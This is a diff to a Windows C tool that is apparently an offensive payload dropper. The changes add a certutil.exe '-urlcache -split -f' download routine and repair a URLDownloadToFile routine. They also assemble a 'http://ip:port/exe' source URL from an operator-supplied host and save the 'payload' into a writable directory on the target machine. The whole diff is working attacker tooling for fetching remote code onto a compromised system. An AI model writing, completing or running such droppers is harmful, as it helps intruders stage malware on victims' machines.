@@ -32,8 +32,13 @@ typedef struct _WRITABLE_DIR {
 } WRITABLE_DIR, *PWRITABLE_DIR;
 
 typedef struct _DOWNLOAD_CONTEXT {
+    char *ip;
+    int ipLen;
+    int port;
     char *sourceUrl;
+    int sourceUrlLen;
     char *targetPath;
+    int targetPathLen;
 } DOWNLOAD_CONTEXT, *PDOWNLOAD_CONTEXT;
 
 static BOOL printHelp = TRUE;
@@ -119,7 +124,7 @@ BOOL PromptUntilValid(const char *prompt, char* buffer, size_t bufferSize, Valid
         fflush(stdout);
         fgets(buffer, (int)bufferSize, stdin);
         buffer[strcspn(buffer, "\n")] = '\0';
-        if (strcmp(buffer, "q") == 0 || strcmp(buffer, "quit") == 0 || strcmp(buffer, "exit") || strcmp(buffer, "no") || strcmp(buffer, "n") == 0) {
+        if (strcmp(buffer, "q") == 0 || strcmp(buffer, "quit") == 0 || strcmp(buffer, "exit") == 0 || strcmp(buffer, "no") == 0 || strcmp(buffer, "n") == 0) {
                 printf("[*] Exiting...\n");
                 return FALSE;
         }
@@ -132,9 +137,7 @@ BOOL PromptUntilValid(const char *prompt, char* buffer, size_t bufferSize, Valid
                 return TRUE;
             }
             continue;   
-        }
-
-        
+        }    
 
         rc = validator(buffer, data);
         if (rc == WIN_ERROR) {
@@ -203,13 +206,30 @@ BOOL IsExecutable(const char *path) {
 	return TRUE;
 }
 
+BOOL LocateBinary(char *binaryPath, const char *binary, DWORD binaryPathSize) {
+    DWORD rc = SearchPathA(
+        NULL,
+        binary,
+        NULL,
+        binaryPathSize,
+        binaryPath,
+        NULL
+    );
+
+    if (!rc) {
+        printf("[-] Binary %s not found!", binary);
+    }
+    
+    return rc;
+}
+
 BOOL DownloadUsingWin32(const PDOWNLOAD_CONTEXT pDc) {
     printf("[*] Downloading the payload using Win32 API\n");
-
+    printf("[*] Target path: %s\n", pDc->targetPath);
     HRESULT hResult = URLDownloadToFile(
         NULL,
         pDc->sourceUrl,
-        pDc->targetDir,
+        pDc->targetPath,
         0, NULL
     );
 
@@ -226,12 +246,25 @@ BOOL DownloadUsingWin32(const PDOWNLOAD_CONTEXT pDc) {
                 break;
             default:
                 fprintf(stderr, "[-] Unknown error. HRESULT: 0x%08lX\n", hResult);
-            }
+                break;
+        }
+        return FALSE;
     }
+
+    return TRUE;
 }
 
 BOOL DownloadUsingCertutil(const PDOWNLOAD_CONTEXT pDc) {
+    char certutilPath[MAX_PATH + 1];
+    int certutilPathLen = LocateBinary(certutilPath, "certutil.exe", MAX_PATH);
+    if (!certutilPathLen) {
+        return FALSE;
+    }
+
     printf("[*] Downloading the payload using certutil.exe\n");
+    char command[pDc->sourceUrlLen + pDc->targetPathLen + MAX_PATH + 64];
+    snprintf(command, sizeof(command), "%s -urlcache -split -f %s %s", certutilPath, pDc->sourceUrl, pDc->targetPath);
+    return ExecuteCommand(command);
 }
 
 BOOL DownloadUsingWget(const PDOWNLOAD_CONTEXT pDc) {
@@ -265,14 +298,17 @@ int HandleDownload(char* opt, void *data) {
         case '0':
            break; 
         case '1':
-            if (!DownloadFromUrl(pDownloadContext)) {
+            if (!DownloadUsingWin32(pDownloadContext)) {
                 return FAIL_ERROR;
             }
             return SUCCESS;
         case '2':
-            break;
+            if (!DownloadUsingCertutil(pDownloadContext)) {
+                return FAIL_ERROR;
+            }
+            return SUCCESS;
         case '3':
-            if (!DownloadWget(pDownloadContext)) {
+            if (!DownloadUsingWget(pDownloadContext)) {
                 return FAIL_ERROR;
             }
             return SUCCESS;
@@ -444,7 +480,7 @@ int main(int argc, char* argv[]) {
     int targetLen; 
     int port; 
     char source[MAX_URL + 1];
-    char targetDir[MAX_PATH + 1];
+    char targetDirTmp[MAX_PATH + 1];
     char opt[16];
 
     char *errMsg;
@@ -460,25 +496,41 @@ int main(int argc, char* argv[]) {
 
 	snprintf(source, MAX_URL, "http://%s:%d/%s", ip, port, exe);
 	printf("[*] Source to extract payload from: %s\n", source);
-    printf("[*] Payload will be uploaded as: %s\n", target);
 
-    if (!PromptUntilValid("Target Directory", targetDir, MAX_PATH, (ValidatorFunc) &HasWriteAccess, NULL)) {
+    if (!PromptUntilValid("Target Directory", targetDirTmp, MAX_PATH, (ValidatorFunc) &HasWriteAccess, NULL)) {
         exit(1); 
     }
-    printf("[+] Payload will be dropped to %s\n", targetDir);
-
-    snprintf(payloadFull, payloadFullLen, "%s\\%s", targetDir, target);
     
+    char targetDir[MAX_PATH + 1];
+    int targetDirLen = GetFullPathNameA(targetDirTmp, MAX_PATH, targetDir, NULL);
+    if (!targetDirLen) {
+        TranslateErrorPrint(GetLastError());
+        exit(1);
+    }
+
+    memcpy(payloadFull, targetDir, targetDirLen);
+    memcpy(payloadFull + targetDirLen, target, targetLen);
+    payloadFull[targetDirLen + targetLen] = '\0';
+    payloadFullLen = strlen(payloadFull);
+
+    printf("[*] Payload will be dropped as %s\n", payloadFull);
+ 
     // Check if file exists
-    if (FileExists(targetDir)) {
-        if (!PromptUntilValid("Overwrite(y/n)", opt, sizeof(opt), NULL, NULL)) {
+    if (FileExists(payloadFull)) {
+        if (!PromptUntilValid("Overwrite[y/n]", opt, sizeof(opt), NULL, NULL)) {
             exit(1);
         }
     }
 
     DOWNLOAD_CONTEXT downloadContext = {
-        .sourceUrl = source;
-    }
+        .ip = ip,
+        .ipLen = ipLen,
+        .port = port,
+        .sourceUrl = source,
+        .sourceUrlLen = strlen(source),
+        .targetPath = payloadFull,
+        .targetPathLen = payloadFullLen
+    };
     printf("\n\n[*] **DOWNLOAD OPTION**\n\n"); 
     HandleDownload(NULL, NULL);
     if (!PromptUntilValid("Choose an option", opt, sizeof(opt), (ValidatorFunc) &HandleDownload, (PDOWNLOAD_CONTEXT) &downloadContext)) {
